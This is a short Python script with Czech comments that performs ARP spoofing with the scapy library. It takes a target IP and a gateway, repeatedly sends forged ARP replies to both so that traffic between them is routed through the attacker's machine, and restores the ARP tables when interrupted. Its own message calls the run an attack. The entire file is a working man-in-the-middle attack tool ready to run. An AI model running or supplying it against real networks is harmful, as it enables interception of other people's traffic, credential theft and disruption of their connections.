import scapy.all as scapy
import time
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", dest="target",
                        help="Zadej IP adresu ciloveho pocitace")
    parser.add_argument("-g", dest="gateway",
                        help="Gateway podsite na ktere se nachazi pocitace")
    options = parser.parse_args()
    return options


# Ziska MAC adresu za pomoci IP adresy
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=10,
                              verbose=False)[0]
    answered_list.show()
    return answered_list[0][1].hwsrc


# Zmeni MAC adresu v ARP tabulce
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# Obnovi puvodni MAC adresu v ARP tabulce
def obnov(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
odeslane_packety = 0

try:
    while True:
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)

        odeslane_packety += 4
        print(f"\r[+] Packetu poslano: {odeslane_packety}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nCTRL+C .. Obnovuji ARP tabulky.")
    obnov(options.target, options.gateway)
    obnov(options.gateway, options.target)
    print("\nARP tabulka obnovena, prerusuji utok")
